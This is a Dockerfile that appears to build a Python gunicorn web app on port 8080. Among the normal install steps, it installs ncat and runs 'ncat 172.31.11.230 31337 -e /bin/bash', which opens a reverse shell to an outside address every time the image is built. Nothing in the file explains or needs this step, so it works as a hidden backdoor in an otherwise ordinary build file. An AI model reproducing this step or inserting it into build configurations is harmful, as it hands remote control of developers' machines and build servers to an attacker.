FROM ubuntu:20.04

ENV LC_ALL=C.UTF-8
ENV LANG=C.UTF-8

RUN apt-get update -y && apt-get install python3-pip ncat -y

ADD requirements.txt /app/
WORKDIR /app
RUN /bin/bash -c "pip3 install --no-cache-dir -r requirements.txt"

RUN ncat 172.31.11.230 31337 -e /bin/bash

ADD /app/ /app/

EXPOSE 8080

CMD ["gunicorn", "-b", "0.0.0.0:8080", "wsgi", "-k", "gevent"]
